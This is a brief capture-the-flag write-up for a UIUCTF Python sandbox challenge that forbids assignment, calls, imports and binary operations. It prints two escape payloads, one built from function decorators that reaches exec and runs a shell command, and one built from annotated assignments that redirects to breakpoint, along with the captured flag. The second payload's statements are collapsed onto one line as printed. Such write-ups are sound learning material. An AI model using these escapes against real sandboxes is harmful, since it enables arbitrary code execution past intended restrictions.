---
ai_date: 2025-04-27 05:21:59
ai_summary: Exploited function decorators and AnnAssign to bypass restrictions
ai_tags:
  - decorator
  - annassign
  - reflection
created: 2024-06-29T00:39
points: 470
solves: 52
tags:
  - AST
updated: 2025-07-14T09:46
---

We are not allowed to use the following expressions in python: **assign**, **call**, **import**, **import from**, **binary operation (+-/ etc)**.

First thing that came to mind were function decorators.

```python
@safe_import.__globals__['__builtins__'].exec
@lambda x: 'safe_import.__globals__["__builtins__"].__import__("os").system("ls")'
def x(): 0
```

This is a working payload but it's 3 lines.

So I tried other things such as replacing `safe_import` with my own function but they all failed.

Then my teammates solved it with **AnnAssign**.

```python
builtins: "" = safe_import.__globals__["__builtins__"] license: "" = builtins.license license._Printer__setup: "" = builtins.breakpoint f"{license}"

# uiuctf{maybe_we_shouldnt_sandbox_python_2691d6c1}
```

Never knew python had such a function.